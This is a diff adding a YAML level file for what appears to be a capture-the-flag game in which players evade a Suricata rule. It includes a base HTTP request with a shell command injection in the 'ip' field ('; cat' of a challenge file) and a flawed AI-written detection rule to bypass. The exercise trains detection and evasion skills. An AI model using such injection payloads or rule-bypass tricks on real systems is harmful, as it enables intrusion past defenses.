@@ -1,0 +1,38 @@
+name: 'Shell Injection (Param) (AI)'
+type: 'exploit'
+
+text: |-
+  Time to bypass the rule(s) below! You're on your own now, but feel free to
+  ask questions!
+
+  I generated this with the following AI prompt (and fixed syntax errors by hand):
+
+  ```
+  Can you write a Suricata rule to detect the HTTP-based exploit below? It's shell command injection in the "ip" parameter:
+
+  POST /detect-dragon.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 10
+  ```
+
+  **Goal: Print (`cat`) the file `/app/dragon-detector-ai`**.
+
+hints: []
+
+target: detector
+
+base_request: |-
+  POST /detect-dragon.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 10
+
+  ip=1.2.3.4; cat /app/dragon-detector-ai
+
+rules:
+# Lots of problems
+- >
+  alert http any any -> any any ( msg:"Command Injection in 'ip' Parameter Detected"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/detect-dragon.php"; http.request_body; content:"ip="; fast_pattern; pcre:"/ip=[^&]*[\;|`]/i"; classtype:web-application-attack; sid:1000001; rev:1;)
+
+expected_output: "This doesn't actually do anything"
